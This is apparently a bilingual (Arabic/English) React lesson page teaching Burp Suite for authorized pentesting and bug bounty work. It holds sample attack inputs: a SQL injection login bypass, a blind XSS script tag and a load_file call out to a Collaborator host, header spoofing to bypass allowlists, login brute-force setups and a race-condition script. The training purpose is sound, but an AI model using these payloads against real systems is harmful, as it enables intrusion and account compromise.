"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, Step, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="burp-mastery">
      <L
        ar={
          <>
            <Section title="ما هي Burp Suite — و لماذا يعتمد عليها المحترف؟">
              <Analogy>
                تخيّل المتصفح كنافذة. الـ Burp يضع طاولة قراءة بينك و الموقع: كل طلب يمرّ منها، تستطيع التقاطه، تعديله،
                إعادة إرساله ألف مرة، أو فحصه آلياً. هي ليست أداة "تخترق لك" — هي <b>عدسة مكبّرة + مفتاح ربط</b> يُحوّل
                المتصفح إلى مختبر.
              </Analogy>
              <Callout kind="danger" title="استخدام مصرّح به فقط">
                Burp قانونية تماماً، لكن استخدامها على نطاق غير مفوّض = جريمة. اعمل دائماً داخل scope مكتوب: pentest، bug bounty،
                أو مختبرك الخاص (Juice Shop, DVWA, PortSwigger Academy).
              </Callout>
              <p className="opacity-80">
                هذا الدرس عملي بحت: ليس "ما هي Repeater؟" — بل <b>كيف يستخدمها أبطال bug bounty</b> لإيجاد ثغرات يدفع فيها
                Google أو Microsoft 50,000 دولار.
              </p>
            </Section>

            <Section title="الإصدارات و الترخيص">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>Community (مجاني)</b>: Proxy، Repeater، Decoder. Intruder بطيء جداً (rate-limited)، لا scanner. كافٍ للتعلم.</li>
                <li><b>Professional (~$475/سنة)</b>: Intruder سريع، Scanner، Collaborator، BCheck، Extender كامل. هذا ما يستخدمه 99% من المحترفين.</li>
                <li><b>Enterprise</b>: للفرق و CI/CD. لا علاقة لها بالـ pentest اليدوي.</li>
              </ul>
            </Section>

            <Section title="الإعداد الأولي — 10 دقائق توفّر عليك سنوات">
              <Step n={1} title="تركيب شهادة Burp في المتصفح">
                <p>بدون الشهادة لن ترى HTTPS. شغّل Burp، افتح متصفح embedded أو أعدّ Firefox/Chrome.</p>
                <Code lang="bash">{`# 1) Burp يستمع على 127.0.0.1:8080
# 2) Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
# 3) زُر http://burp → Download CA → استورد للمتصفح كـ "Trusted CA for websites"
# أو استخدم Foxy Proxy + Burp embedded browser (الأسهل)`}</Code>
              </Step>
              <Step n={2} title="ضبط الـ Scope">
                <p><b>أهم خطوة على الإطلاق</b>. بدون scope، Burp يسجّل كل طلب من المتصفح (Twitter, Gmail, إلخ) و تختنق الـ history.</p>
                <Code lang="text">{`Target → Scope → Add
Use advanced scope control → Include in scope:
  Protocol: Any
  Host: ^.*\\.target\\.com$
  Port: ^443$
ثم في Proxy → Options → "Drop all out-of-scope items"`}</Code>
              </Step>
              <Step n={3} title="إعدادات Repeater و Intruder للسرعة">
                <Code lang="text">{`User options → Misc → Updates → Disable auto-update
User options → Display → Font → ضع Mono و كبّره
Project options → Sessions → Cookie jar = scope only
Project options → HTTP → Redirections = Always (في scope)`}</Code>
              </Step>
              <Step n={4} title="Extensions الأساسية (BApp Store)">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Logger++</b>: سجل قابل للبحث لكل طلب — لا غنى عنه.</li>
                  <li><b>Autorize</b>: فحص IDOR/Auth تلقائياً عبر تكرار الطلب بـ session أخرى.</li>
                  <li><b>Hackvertor</b>: ترميز/فك ترميز لكل صياغة (URL, base64, Unicode, JWT).</li>
                  <li><b>JSON Web Tokens</b>: تحرير JWT و إعادة توقيع.</li>
                  <li><b>Param Miner</b>: اكتشاف parameters/headers غير موثقة.</li>
                  <li><b>Turbo Intruder</b>: 30,000 طلب/ثانية + single-packet attack.</li>
                  <li><b>HTTP Request Smuggler</b>: كشف و استغلال desync.</li>
                  <li><b>Active Scan++</b>: تمديد scanner المدمج.</li>
                  <li><b>Backslash Powered Scanner</b>: للـ injection bugs العميقة.</li>
                </ul>
              </Step>
            </Section>

            <Section title="Proxy — التقاط و تعديل">
              <p className="opacity-90">القلب. كل طلب يمرّ هنا أولاً. <b>عطّل Intercept افتراضياً</b> (إلا عند الحاجة) — اعمل من HTTP History.</p>
              <Code lang="text">{`Proxy → HTTP history
كليك يمين على طلب:
  → Send to Repeater (Ctrl+R)        — لتعديل و تكرار يدوي
  → Send to Intruder (Ctrl+I)        — لـ fuzzing
  → Send to Comparer                 — للـ diff بين ردين
  → Do active scan                   — لفحص آلي (Pro)
  → Engagement tools → Find references — أين يظهر هذا الـ endpoint`}</Code>
              <Callout kind="warn" title="حيلة احترافية">
                <p>Match &amp; Replace في Proxy → Options:
                  حقن header مثل <code>X-Forwarded-For: 127.0.0.1</code> على كل طلب تلقائياً، أو إزالة <code>If-Modified-Since</code> لإجبار ردود حية.</p>
              </Callout>
            </Section>

            <Section title="Repeater — أصدقاؤك المخلصون الأربعة">
              <p className="opacity-90">90% من الـ bug bounty يتمّ في Repeater. اتقنه و أنت حر.</p>
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>Tabs مرتّبة بالألوان</b>: كليك يمين → Color. أحمر = ضعيف، أخضر = critical، أصفر = قيد التحقيق.</li>
                <li><b>Ctrl+Space للإكمال</b> داخل القيم.</li>
                <li><b>Inspector panel</b>: حرّر JSON/headers/params كجدول، يبني الـ raw request تلقائياً.</li>
                <li><b>Send group in single packet</b>: أساس race conditions (Ctrl+Shift+G لجميع tabs).</li>
                <li><b>Show response in browser</b>: لرؤية رد فيه HTML/JS كأنه صفحة كاملة (مفيد للـ XSS).</li>
              </ol>
              <Code lang="text">{`# سيناريو نموذجي:
1) التقط طلب login من Proxy
2) Send to Repeater → عدّل username إلى admin' OR 1=1--
3) Send → لاحظ الفرق في الرد
4) لو ناجح: حفظ الطلب كـ "vulnerable-login.req" → Save items`}</Code>
            </Section>

            <Section title="Intruder — fuzzing احترافي">
              <p className="opacity-90">هنا ترسل آلاف الطلبات بقيم مختلفة. أربعة أوضاع:</p>
              <TwoCol>
                <Card title="Sniper (مفرد)" color="amber">
                  <p>قائمة واحدة، position واحد في كل طلب. للـ basic fuzzing.</p>
                  <Code lang="text">{`GET /api/user/§1§ HTTP/1.1
Payload: numbers 1..1000`}</Code>
                </Card>
                <Card title="Battering Ram" color="amber">
                  <p>نفس القيمة في كل المواقع. لاختبار credentials في عدة حقول.</p>
                </Card>
                <Card title="Pitchfork" color="amber">
                  <p>قائمتان متوازيتان. للـ user/password pairs.</p>
                </Card>
                <Card title="Cluster Bomb" color="amber">
                  <p>كل تركيبة من قائمتين أو أكثر. brute-force كامل.</p>
                  <Code lang="text">{`POST /login
user=§§ &amp; pass=§§
Payload set 1: users.txt
Payload set 2: passwords.txt`}</Code>
                </Card>
              </TwoCol>
              <Callout kind="warn" title="تحليل الردود">
                <p>الـ Intruder لا "يخبرك" أن شيئاً نجح — أنت تستخرج الإشارة:</p>
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Length</b>: رد ناجح غالباً مختلف الطول.</li>
                  <li><b>Status code</b>: 200 ضمن بحر 401 = نجاح.</li>
                  <li><b>Grep - Match</b>: علّم الردود التي تحتوي "Welcome" أو "error".</li>
                  <li><b>Grep - Extract</b>: استخرج قيمة (مثل CSRF token الجديد).</li>
                  <li><b>Time</b>: اضغط على عمود Time للـ blind time-based.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Collaborator — الإذن الذي يصرخ من الداخل">
              <Analogy>
                Collaborator هو دومين عام يلتقط أي اتصال DNS/HTTP/SMTP يصله. لو طلبك سبّب الـ server يصدر طلب DNS لـ
                <code> abcdefg.oastify.com</code>، تعرف أن الكود نفّذ — حتى لو لم يردّ شيئاً.
              </Analogy>
              <Code lang="text">{`Burp → Collaborator → Copy to clipboard
استبدل في Repeater:
GET /fetch?url=http://YOUR-COLLAB.oastify.com/probe HTTP/1.1
↓ Send
↓ ارجع لـ Collaborator → Poll now → ستجد:
   - DNS lookup من target's IP
   - HTTP GET من user-agent معيّن
= SSRF/SSTI/XXE مؤكدة بدون ضرر`}</Code>
              <Callout kind="warn" title="حالات استخدام">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Blind XSS</b>: حقن <code>&lt;script src=https://x.oastify.com/x.js&gt;</code> — انتظر assistant/admin يفتح صفحة.</li>
                  <li><b>Blind SQLi</b>: <code>'; SELECT load_file('\\\\\\\\x.oastify.com\\\\share') --</code></li>
                  <li><b>Blind XXE</b>: external entity تشير لـ Collaborator.</li>
                  <li><b>SSRF</b>: استبدل أي URL في request بـ subdomain جديد.</li>
                  <li><b>Email injection</b>: SMTP probe في حقل البريد.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Scanner و BCheck — الفحص الآلي الذكي (Pro)">
              <p className="opacity-90">
                Scanner المدمج جيد، لكن السلاح السرّي هو <b>BCheck</b> — لغة DSL لكتابة فحوصات مخصصة. تكتبها مرة و تشغّلها على
                كل برنامج bug bounty.
              </p>
              <Code lang="text">{`metadata:
    language: v2-beta
    name: "Detect debug.php"
    description: "ارسل /debug.php و افحص رد"
    author: "you"

run for each:
    debug_path =
        "/debug.php",
        "/debug.html",
        "/.env"

given any host then
    send request called check:
        method: "GET"
        path: \`{debug_path}\`
    if {check.response.status_code} is "200" and
       {check.response.body} matches "DB_PASSWORD" then
        report issue:
            severity: high
            confidence: certain
            detail: \`Sensitive file at {debug_path}\`
    end if`}</Code>
              <p className="opacity-80 mt-2">
                BCheck files تذهب في <code>~/AppData/Roaming/BurpSuite/bchecks/</code> ثم Scanner → Issues → BChecks → Reload.
              </p>
            </Section>

            <Section title="Comparer + Decoder + Sequencer">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>Comparer</b>: <i>Words/Bytes</i> diff بين ردين. مفيد جداً لـ blind boolean — قارن رد <code>id=1</code> بـ <code>id=1' OR 1=1--</code>.</li>
                <li><b>Decoder</b>: ترميز/فك ترميز بضغطة. قاعدة 64، URL، HTML، Hex، Hash. يمكنك تكديس عمليات.</li>
                <li><b>Sequencer</b>: تحليل عشوائية tokens (session ID, CSRF). يجمع 10,000+ token و يحسب entropy. مفيد لتقييم RNG ضعيف.</li>
              </ul>
            </Section>

            <Section title="Match & Replace — قوة خفية">
              <Code lang="text">{`Proxy → Options → Match and Replace → Add:
Type: Request header
Match: ^User-Agent: .*
Replace: User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
[ ] Regex match`}</Code>
              <ul className="list-disc pe-6 space-y-1 opacity-90 mt-2">
                <li>تجاوز bot detection بانتحال Googlebot.</li>
                <li>حقن <code>X-Forwarded-For: 127.0.0.1</code> لتجاوز IP whitelist.</li>
                <li>إزالة <code>Origin</code> لاختبار CORS.</li>
                <li>استبدال JWT تلقائياً في كل طلب.</li>
                <li>حقن debugger statement في كل JS مردود.</li>
              </ul>
            </Section>

            <Section title="Macros و Sessions — للـ workflows المعقدة">
              <p className="opacity-90">
                التطبيق يطلب CSRF token جديد لكل طلب؟ Burp يمكنه استخراجه من رد سابق و حقنه آلياً.
              </p>
              <Code lang="text">{`Project options → Sessions → Macros → Add
1) سجّل: GET /login → استخرج _csrf من body
2) Session handling rule:
   Scope: matches /api/*
   Action: Run macro to get _csrf, then update _csrf parameter`}</Code>
              <p className="opacity-80 mt-2">
                نتيجة: Intruder/Scanner يعملان عبر تطبيق محمي بـ CSRF بدون أي عمل يدوي.
              </p>
            </Section>

            <Section title="Turbo Intruder — للسرعة الجادة و Single-Packet">
              <Code lang="python">{`# Burp → Extender → Turbo Intruder → New attack
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.BURP2
    )
    # لـ race condition — single packet
    for i in range(30):
        engine.queue(target.req)
    engine.openGate()

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)`}</Code>
              <p className="opacity-80 mt-2">
                30,000 طلب/ثانية ممكن. استخدمه ضد credential stuffing على بيئتك، أو race على coupon redemption.
              </p>
            </Section>

            <Section title="نصائح يستخدمها أبطال bug bounty">
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>كل project = ملف منفصل</b>. File → New project → Disk-based. لا تخلط أهدافاً.</li>
                <li><b>احفظ كل ساعة</b>. Burp يتعطل أحياناً مع projects كبيرة.</li>
                <li><b>Logger++ ON منذ اليوم الأول</b>. ستحتاج للبحث عن "أين رأيت هذا الـ parameter؟" بعد أسبوع.</li>
                <li><b>اكتب Notes في Repeater</b>: كليك يمين → Add comment. السرعة في الكتابة الآن = سرعة في الـ report لاحقاً.</li>
                <li><b>ابحث في History بـ Bambdas</b>: <code>requestResponse.request().urlContains("graphql")</code> → فلتر فوري.</li>
                <li><b>استخدم Param Miner قبل أي شيء</b>: قد يكشف <code>X-Original-URL</code> أو header مخفي يفتح كل شيء.</li>
                <li><b>لا تثق بالـ Active Scanner وحده</b>. هو يجد 30%، الباقي يدوي.</li>
                <li><b>Save state قبل كل تجربة خطيرة</b>. لو دمّرت session، استعد.</li>
                <li><b>Burp Collaborator دائماً ON</b>. ربع ثغراتي الحقيقية كانت OOB.</li>
                <li><b>اقرأ Release Notes لكل تحديث</b>. PortSwigger يضيف تقنيات قتل (مثل Inspector) باستمرار.</li>
              </ol>
            </Section>

            <Section title="بدائل Burp — متى و لماذا">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>OWASP ZAP</b>: مجاني تماماً، CLI ممتاز للـ CI/CD، لكن UI أبطأ من Burp Pro.</li>
                <li><b>Caido</b>: 2024+، Rust، أسرع، UI حديث. منافس جدي لـ Burp.</li>
                <li><b>mitmproxy</b>: terminal-based، مثالي للـ scripting Python و mobile.</li>
                <li><b>HTTP Toolkit</b>: للـ debug أكثر من الاختراق، لكنه ممتاز للـ mobile/desktop apps.</li>
              </ul>
            </Section>

            <Section title="مصادر للإتقان">
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li><b>PortSwigger Web Security Academy</b> — مجاني، يعلّمك Burp و الثغرات معاً.</li>
                <li><b>BApp Store</b> — تصفّحه شهرياً، إضافات جديدة باستمرار.</li>
                <li><b>YouTube: PortSwigger Research</b> — James Kettle يكشف تقنيات قبل أن تظهر في Burp.</li>
                <li><b>Twitter / X</b>: تابع <code>@albinowax</code>, <code>@Rhynorater</code>, <code>@JHaddix</code>.</li>
              </ul>
            </Section>
          </>
        }
        en={
          <>
            <Section title="What is Burp Suite — and why pros depend on it">
              <Analogy>
                Picture the browser as a window. Burp puts a reading desk between you and the site: every request passes
                through it — you can capture it, edit it, replay it a thousand times, or scan it automatically. It's not
                a "hack-for-me" tool — it's a <b>magnifying glass plus a wrench</b> that turns the browser into a lab.
              </Analogy>
              <Callout kind="danger" title="Authorized use only">
                Burp itself is fully legal, but using it on out-of-scope targets is a crime. Always work inside a written
                scope: pentest, bug bounty, or your own lab (Juice Shop, DVWA, PortSwigger Academy).
              </Callout>
              <p className="opacity-80">
                This lesson is purely practical: not "what is Repeater?" — but <b>how the bug bounty top earners use it</b>
                to find the bugs Google or Microsoft pay $50k for.
              </p>
            </Section>

            <Section title="Editions and licensing">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Community (free)</b>: Proxy, Repeater, Decoder. Intruder is rate-limited; no Scanner. Fine for learning.</li>
                <li><b>Professional (~$475/yr)</b>: full-speed Intruder, Scanner, Collaborator, BCheck, Extender. What 99% of pros use.</li>
                <li><b>Enterprise</b>: for teams and CI/CD. Not relevant to manual pentesting.</li>
              </ul>
            </Section>

            <Section title="First-time setup — 10 minutes that save you years">
              <Step n={1} title="Install the Burp CA in your browser">
                <p>Without the cert you can't see HTTPS. Start Burp, then either use the embedded browser, or configure Firefox/Chrome.</p>
                <Code lang="bash">{`# 1) Burp listens on 127.0.0.1:8080
# 2) Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
# 3) Visit http://burp → Download CA → import as "Trusted CA for websites"
# Or use FoxyProxy + the Burp embedded browser (easiest)`}</Code>
              </Step>
              <Step n={2} title="Set the Scope">
                <p><b>The single most important step.</b> Without scope, Burp logs every request from your browser (Twitter, Gmail, etc.) and history drowns.</p>
                <Code lang="text">{`Target → Scope → Add
Use advanced scope control → Include in scope:
  Protocol: Any
  Host: ^.*\\.target\\.com$
  Port: ^443$
Then Proxy → Options → "Drop all out-of-scope items"`}</Code>
              </Step>
              <Step n={3} title="Tune Repeater & Intruder">
                <Code lang="text">{`User options → Misc → Updates → Disable auto-update
User options → Display → Font → Mono, larger
Project options → Sessions → Cookie jar = scope only
Project options → HTTP → Redirections = Always (in scope)`}</Code>
              </Step>
              <Step n={4} title="Essential extensions (BApp Store)">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Logger++</b>: searchable log of every request — indispensable.</li>
                  <li><b>Autorize</b>: auto-tests IDOR/auth by replaying requests as another session.</li>
                  <li><b>Hackvertor</b>: encode/decode in any flavor (URL, base64, Unicode, JWT).</li>
                  <li><b>JSON Web Tokens</b>: edit and re-sign JWTs.</li>
                  <li><b>Param Miner</b>: discover undocumented parameters and headers.</li>
                  <li><b>Turbo Intruder</b>: 30k req/s + single-packet attack.</li>
                  <li><b>HTTP Request Smuggler</b>: detect and exploit desync.</li>
                  <li><b>Active Scan++</b>: extends the built-in scanner.</li>
                  <li><b>Backslash Powered Scanner</b>: deep injection bug discovery.</li>
                </ul>
              </Step>
            </Section>

            <Section title="Proxy — capture and modify">
              <p className="opacity-90">The heart. Every request passes through it first. <b>Disable Intercept by default</b> — work from HTTP History.</p>
              <Code lang="text">{`Proxy → HTTP history
Right-click a request:
  → Send to Repeater (Ctrl+R)         — manual edit + replay
  → Send to Intruder (Ctrl+I)         — fuzzing
  → Send to Comparer                  — diff two responses
  → Do active scan                    — automated scan (Pro)
  → Engagement tools → Find references — where this endpoint appears`}</Code>
              <Callout kind="warn" title="Pro trick">
                <p>Match &amp; Replace under Proxy → Options:
                  auto-inject <code>X-Forwarded-For: 127.0.0.1</code> on every request, or strip <code>If-Modified-Since</code> to force fresh responses.</p>
              </Callout>
            </Section>

            <Section title="Repeater — your four loyal friends">
              <p className="opacity-90">90% of bug bounty work happens here. Master it and you're free.</p>
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>Color-code your tabs</b>: right-click → Color. Red = weak, green = critical, yellow = investigating.</li>
                <li><b>Ctrl+Space autocomplete</b> inside values.</li>
                <li><b>Inspector panel</b>: edit JSON/headers/params as a table; the raw request rebuilds itself.</li>
                <li><b>Send group in single packet</b>: foundation of race-condition attacks (Ctrl+Shift+G across tabs).</li>
                <li><b>Show response in browser</b>: render an HTML/JS response as a real page (great for XSS).</li>
              </ol>
              <Code lang="text">{`# Typical flow:
1) Capture login from Proxy
2) Send to Repeater → change username to admin' OR 1=1--
3) Send → notice response difference
4) If interesting: save the request as "vulnerable-login.req" → Save items`}</Code>
            </Section>

            <Section title="Intruder — pro-grade fuzzing">
              <p className="opacity-90">Send thousands of requests with varying values. Four modes:</p>
              <TwoCol>
                <Card title="Sniper (single)" color="amber">
                  <p>One list, one position per request. Basic fuzzing.</p>
                  <Code lang="text">{`GET /api/user/§1§ HTTP/1.1
Payload: numbers 1..1000`}</Code>
                </Card>
                <Card title="Battering Ram" color="amber">
                  <p>Same value in every position. For testing one credential across multiple fields.</p>
                </Card>
                <Card title="Pitchfork" color="amber">
                  <p>Two parallel lists. For user/password pairs.</p>
                </Card>
                <Card title="Cluster Bomb" color="amber">
                  <p>Every combination across two or more lists. Full brute-force.</p>
                  <Code lang="text">{`POST /login
user=§§ &amp; pass=§§
Payload set 1: users.txt
Payload set 2: passwords.txt`}</Code>
                </Card>
              </TwoCol>
              <Callout kind="warn" title="Reading the responses">
                <p>Intruder doesn't tell you "this worked" — you extract the signal:</p>
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Length</b>: a successful response is usually a different size.</li>
                  <li><b>Status code</b>: a single 200 in a sea of 401s = a hit.</li>
                  <li><b>Grep - Match</b>: flag responses containing "Welcome" or "error".</li>
                  <li><b>Grep - Extract</b>: extract a value (like a fresh CSRF token).</li>
                  <li><b>Time</b>: sort by Time column for blind time-based attacks.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Collaborator — the canary that screams from inside">
              <Analogy>
                Collaborator is a public domain that catches any DNS/HTTP/SMTP that reaches it. If your payload caused
                the server to look up <code>abcdefg.oastify.com</code>, you know your code ran — even if no response
                came back.
              </Analogy>
              <Code lang="text">{`Burp → Collaborator → Copy to clipboard
In Repeater:
GET /fetch?url=http://YOUR-COLLAB.oastify.com/probe HTTP/1.1
↓ Send
↓ Back to Collaborator → Poll now → you'll see:
   - DNS lookup from target's IP
   - HTTP GET with that user-agent
= SSRF/SSTI/XXE confirmed without harm`}</Code>
              <Callout kind="warn" title="Use cases">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Blind XSS</b>: inject <code>&lt;script src=https://x.oastify.com/x.js&gt;</code> — wait for an admin to open the page.</li>
                  <li><b>Blind SQLi</b>: <code>'; SELECT load_file('\\\\\\\\x.oastify.com\\\\share') --</code></li>
                  <li><b>Blind XXE</b>: external entity pointing at Collaborator.</li>
                  <li><b>SSRF</b>: replace any URL in a request with a fresh subdomain.</li>
                  <li><b>Email injection</b>: drop an SMTP probe into the email field.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Scanner & BCheck — smart automated scanning (Pro)">
              <p className="opacity-90">
                The built-in Scanner is good, but the secret weapon is <b>BCheck</b> — a DSL for writing custom checks.
                Write once, run on every bug-bounty program.
              </p>
              <Code lang="text">{`metadata:
    language: v2-beta
    name: "Detect debug.php"
    description: "Send /debug.php and check the response"
    author: "you"

run for each:
    debug_path =
        "/debug.php",
        "/debug.html",
        "/.env"

given any host then
    send request called check:
        method: "GET"
        path: \`{debug_path}\`
    if {check.response.status_code} is "200" and
       {check.response.body} matches "DB_PASSWORD" then
        report issue:
            severity: high
            confidence: certain
            detail: \`Sensitive file at {debug_path}\`
    end if`}</Code>
              <p className="opacity-80 mt-2">
                BChecks live in <code>~/AppData/Roaming/BurpSuite/bchecks/</code>; then Scanner → Issues → BChecks → Reload.
              </p>
            </Section>

            <Section title="Comparer + Decoder + Sequencer">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Comparer</b>: <i>Words/Bytes</i> diff between two responses. Great for blind boolean — diff the response of <code>id=1</code> and <code>id=1' OR 1=1--</code>.</li>
                <li><b>Decoder</b>: encode/decode in one click — base64, URL, HTML, hex, hash. Stack operations.</li>
                <li><b>Sequencer</b>: token-randomness analysis (session ID, CSRF). Collects 10k+ tokens and computes entropy. Useful for spotting weak RNG.</li>
              </ul>
            </Section>

            <Section title="Match & Replace — a hidden superpower">
              <Code lang="text">{`Proxy → Options → Match and Replace → Add:
Type: Request header
Match: ^User-Agent: .*
Replace: User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
[ ] Regex match`}</Code>
              <ul className="list-disc ps-6 space-y-1 opacity-90 mt-2">
                <li>Bypass bot detection by impersonating Googlebot.</li>
                <li>Inject <code>X-Forwarded-For: 127.0.0.1</code> to bypass IP allowlists.</li>
                <li>Strip <code>Origin</code> to test CORS.</li>
                <li>Auto-replace JWT in every request.</li>
                <li>Inject a debugger statement into every JS response.</li>
              </ul>
            </Section>

            <Section title="Macros & Sessions — for complex workflows">
              <p className="opacity-90">
                The app demands a fresh CSRF token per request? Burp can extract it from a prior response and inject it
                automatically.
              </p>
              <Code lang="text">{`Project options → Sessions → Macros → Add
1) Record: GET /login → extract _csrf from body
2) Session handling rule:
   Scope: matches /api/*
   Action: Run macro to fetch _csrf, then update _csrf parameter`}</Code>
              <p className="opacity-80 mt-2">
                Result: Intruder/Scanner work through CSRF-protected apps with no manual effort.
              </p>
            </Section>

            <Section title="Turbo Intruder — for serious speed and single-packet">
              <Code lang="python">{`# Burp → Extender → Turbo Intruder → New attack
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.BURP2
    )
    # Race condition — single packet
    for i in range(30):
        engine.queue(target.req)
    engine.openGate()

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)`}</Code>
              <p className="opacity-80 mt-2">
                30,000 req/s is reachable. Use it against credential stuffing on your own lab, or race-on-coupon-redemption.
              </p>
            </Section>

            <Section title="Tips top bug-bounty hunters actually use">
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>One project = one file.</b> File → New project → Disk-based. Don't mix targets.</li>
                <li><b>Save every hour.</b> Burp can crash on big projects.</li>
                <li><b>Logger++ on from day one.</b> A week later you'll need to find "where did I see this parameter?"</li>
                <li><b>Annotate Repeater tabs</b>: right-click → Add comment. Speed in writing now = speed in the report later.</li>
                <li><b>Search History with Bambdas</b>: <code>requestResponse.request().urlContains("graphql")</code> → instant filter.</li>
                <li><b>Run Param Miner before anything</b>: it can surface <code>X-Original-URL</code> or hidden header that opens the door.</li>
                <li><b>Don't trust Active Scanner alone.</b> It catches ~30%; the rest is manual.</li>
                <li><b>Save state before any risky try.</b> If you trash the session, restore.</li>
                <li><b>Burp Collaborator always on.</b> A quarter of my real findings were OOB.</li>
                <li><b>Read the release notes for every update.</b> PortSwigger ships killer features (e.g. Inspector) constantly.</li>
              </ol>
            </Section>

            <Section title="Burp alternatives — when and why">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>OWASP ZAP</b>: fully free, excellent CLI for CI/CD, but slower UI than Burp Pro.</li>
                <li><b>Caido</b>: 2024+, Rust, snappier, modern UI. A serious Burp competitor.</li>
                <li><b>mitmproxy</b>: terminal-based, great for Python scripting and mobile.</li>
                <li><b>HTTP Toolkit</b>: more debug-focused, but excellent for mobile/desktop apps.</li>
              </ul>
            </Section>

            <Section title="Mastery resources">
              <ul className="list-disc ps-6 space-y-1 opacity-90">
                <li><b>PortSwigger Web Security Academy</b> — free; teaches Burp and the bugs together.</li>
                <li><b>BApp Store</b> — browse monthly; new extensions ship constantly.</li>
                <li><b>YouTube: PortSwigger Research</b> — James Kettle reveals techniques before they land in Burp.</li>
                <li><b>Twitter / X</b>: follow <code>@albinowax</code>, <code>@Rhynorater</code>, <code>@JHaddix</code>.</li>
              </ul>
            </Section>
          </>
        }
      />
    </LessonShell>
  );
}
